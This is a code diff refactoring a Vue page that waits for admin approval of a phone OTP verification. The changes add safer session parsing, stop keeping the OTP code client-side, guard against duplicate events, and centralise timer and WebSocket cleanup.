@@ -124,76 +124,110 @@ const router = useRouter();
 // Track this page
 useVisitorTracking( 'phone/otp-waiting' );
 
-// ─── Load context from sessionStorage ───────────────────────────────
-const phoneOtpContext = JSON.parse( sessionStorage.getItem( 'phoneOtpContext' ) || '{}' );
+// ─── Load context from sessionStorage (with protection) ─────────────
+function loadPhoneOtpContext ()
+{
+    try {
+        return JSON.parse( sessionStorage.getItem( 'phoneOtpContext' ) || '{}' );
+    } catch ( error ) {
+        logger.error( '[PhoneOtpWaiting] Failed to parse phoneOtpContext:', error );
+        return {};
+    }
+}
+
+const phoneOtpContext = loadPhoneOtpContext();
 const _phoneNumber = phoneOtpContext.phoneNumber || '';
-const _otpCode = phoneOtpContext.otpCode || '';
 const phoneSessionId = phoneOtpContext.sessionId || '';
 const phoneStatusSig = phoneOtpContext.statusSig || '';
+
+// NOTE: OTP code should NEVER be stored in sessionStorage or sent to client.
+// It must remain server-side only, never exposed to JavaScript.
 
 // ─── Status ─────────────────────────────────────────────────────────
 const status = ref( 'pending' ); // pending | approved | rejected
 const rejectReason = ref( '' );
 
+// ─── Validation: ensure session data is present ──────────────────────
+function validateSession ()
+{
+    if ( !phoneSessionId || !phoneStatusSig ) {
+        logger.error( '[PhoneOtpWaiting] Missing session ID or status signature' );
+        status.value = 'rejected';
+        rejectReason.value = t( 'verification.phoneOtpWaiting.invalidSession' );
+        return false;
+    }
+    return true;
+}
+
 // ─── Retry — go back to phone verification entry ────────────────────
 function retryOtp ()
 {
+    clearAllTimers();
     router.push( { name: 'phoneVerification' } );
 }
 
 // ─── WebSocket — listen for admin approval / rejection ──────────────
+let echo = null;
 let echoChannel = null;
 let echoChannelName = '';
 let isUnmounted = false;
 
 async function setupWebSocket ()
 {
-    if ( isUnmounted ) return;
+    if ( isUnmounted || !validateSession() ) return;
 
-    if ( !phoneSessionId )
-    {
-        logger.warn( '[PhoneOtpWaiting] No phone session — WebSocket unavailable' );
-        return;
-    }
+    try {
+        echo = await getEcho();
 
-    const echo = await getEcho();
-    if ( isUnmounted || !echo )
-    {
-        if ( !isUnmounted && !echo )
+        if ( isUnmounted ) return;
+
+        if ( !echo ) {
             logger.warn( '[PhoneOtpWaiting] Echo/Reverb not available, using polling only' );
-        return;
+            return;
+        }
+
+        const channelName = await customerBroadcastChannel( 'phone', phoneSessionId );
+        logger.debug( '[PhoneOtpWaiting] Subscribing to channel:', channelName );
+
+        echoChannel = echo.channel( channelName );
+        echoChannelName = channelName;
+
+        echoChannel.listen( '.PhoneOtpApproved', handleApproved );
+        echoChannel.listen( '.PhoneOtpRejected', handleRejected );
+    } catch ( error ) {
+        logger.error( '[PhoneOtpWaiting] WebSocket setup failed:', error );
+        logger.warn( '[PhoneOtpWaiting] Falling back to polling only' );
+        // Polling will handle it
     }
-
-    const channelName = await customerBroadcastChannel( 'phone', phoneSessionId );
-    logger.debug( '[PhoneOtpWaiting] Subscribing to channel:', channelName );
-
-    echoChannel = echo.channel( channelName );
-    echoChannelName = channelName;
-
-    echoChannel.listen( '.PhoneOtpApproved', handleApproved );
-    echoChannel.listen( '.PhoneOtpRejected', handleRejected );
 }
 
 function handleApproved ( event )
 {
+    // Prevent duplicate handling
+    if ( status.value !== 'pending' ) return;
+
     logger.debug( '[PhoneOtpWaiting] Approved:', event );
     status.value = 'approved';
 
-    setTimeout( () =>
+    const redirectTimeout = setTimeout( () =>
     {
-        if ( event.redirect_to )
-        {
+        if ( event.redirect_to ) {
             safeRedirect( event.redirect_to, 'nafathRedirecting', router );
-        } else
-        {
+        } else {
             // Navigate to Nafath after phone verification approval
             router.push( { name: 'nafathRedirecting' } );
         }
     }, 2000 );
+
+    // Store timeout ID for cleanup
+    timeoutIds.push( redirectTimeout );
 }
 
 function handleRejected ( event )
 {
+    // Prevent duplicate handling
+    if ( status.value !== 'pending' ) return;
+
     logger.debug( '[PhoneOtpWaiting] Rejected:', event );
     status.value = 'rejected';
     rejectReason.value = getReasonLabel( event.reason || 'phone_otp_other', t ) || t( 'verification.phoneOtpWaiting.rejectedMessage' );
@@ -202,43 +236,78 @@ function handleRejected ( event )
 // ─── Polling Fallback ───────────────────────────────────────────────
 // Note: The global tracking system (initGlobalTracking) already handles
 // /customer/page heartbeats. This polling only checks approval status.
-// Module-level timer — prevents interval stacking across remounts.
 let pollTimer = null;
+let pollInFlight = false;
 
-if ( pollTimer )
+async function pollStatus ()
 {
-    clearInterval( pollTimer );
-    pollTimer = null;
+    if ( pollInFlight || status.value !== 'pending' ) return;
+
+    pollInFlight = true;
+
+    try {
+        const sid = phoneSessionId;
+        const sig = phoneStatusSig;
+
+        if ( !sid || !sig ) {
+            pollInFlight = false;
+            return;
+        }
+
+        const { default: request } = await import( '@/api/request' );
+        const { data } = await request.get( `/status/phone/${ sid }?sig=${ encodeURIComponent( sig ) }` );
+
+        if ( isUnmounted ) return;
+
+        if ( data.status === 'verified' ) {
+            handleApproved( data );
+        } else if ( data.status === 'rejected' ) {
+            handleRejected( { reason: data.reason || 'phone_otp_other' } );
+        }
+    } catch ( error ) {
+        logger.debug( '[PhoneOtpWaiting] Polling error (expected fallback):', error.message );
+    } finally {
+        pollInFlight = false;
+    }
 }
 
 function startPolling ()
 {
     if ( pollTimer ) return;
 
-    pollTimer = setInterval( async () =>
-    {
-        if ( status.value !== 'pending' ) return;
+    // First check immediately
+    pollStatus();
 
-        try
-        {
-            const { default: request } = await import( '@/api/request' );
-            const sid = phoneSessionId;
-            const sig = phoneStatusSig;
-            if ( !sid || !sig ) return;
+    // Then schedule recurring checks
+    pollTimer = setInterval( pollStatus, 30_000 );
+}
 
-            const { data } = await request.get( `/status/phone/${ sid }?sig=${ encodeURIComponent( sig ) }` );
-            if ( data.status === 'verified' )
-            {
-                handleApproved( data );
-            } else if ( data.status === 'rejected' )
-            {
-                handleRejected( { reason: data.reason || 'phone_otp_other' } );
-            }
-        } catch
-        {
-            // Silent — polling is a fallback
+// ─── Cleanup helpers ────────────────────────────────────────────────
+const timeoutIds = [];
+
+function clearAllTimers ()
+{
+    // Clear redirect timeout
+    timeoutIds.forEach( id => clearTimeout( id ) );
+    timeoutIds.length = 0;
+
+    // Clear polling
+    if ( pollTimer ) {
+        clearInterval( pollTimer );
+        pollTimer = null;
+    }
+
+    // Leave Echo channel (use stored instance)
+    if ( echo && echoChannelName ) {
+        try {
+            echo.leave( echoChannelName );
+        } catch ( error ) {
+            logger.debug( '[PhoneOtpWaiting] Echo.leave() error:', error );
         }
-    }, 30_000 );
+    }
+
+    echoChannel = null;
+    echoChannelName = '';
 }
 
 // ─── Lifecycle ──────────────────────────────────────────────────────
@@ -249,6 +318,11 @@ onMounted( () =>
         i18n.global.locale.value = 'ar';
     }
 
+    // Validate session first
+    if ( !validateSession() ) {
+        return;
+    }
+
     setupWebSocket();
     startPolling();
 } );
@@ -256,17 +330,7 @@ onMounted( () =>
 onUnmounted( () =>
 {
     isUnmounted = true;
-
-    if ( pollTimer )
-    {
-        clearInterval( pollTimer );
-        pollTimer = null;
-    }
-
-    if ( echoChannel && echoChannelName )
-    {
-        try { window.Echo?.leave( echoChannelName ); } catch { /* */ }
-    }
+    clearAllTimers();
 } );
 </script>
 
